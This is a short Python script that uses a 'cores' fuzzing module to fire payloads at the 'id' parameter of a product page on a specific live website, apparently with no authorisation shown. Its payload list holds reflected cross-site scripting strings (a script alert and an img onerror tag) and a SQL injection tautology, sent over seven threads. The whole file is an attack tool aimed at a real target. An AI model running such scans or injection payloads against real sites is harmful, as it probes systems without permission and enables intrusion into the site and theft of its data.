url = "http://www.aseafood.vn/product_details.php?id=1"

import cores

url = cores.get_params(url) # TODO bug get_params multiple parameters
url, params = url.keys()[0], url.values()[0]
check_param = ["id"]

from cores import fuzz

payloads = """"><script>alert(1);</script>
' or '1'='1 --
'<img src='x' onerror=alert(1)/>
;!@#""".split("\n")

threads = 7

fuzz.get_method(url, params, check_param, payloads, threads)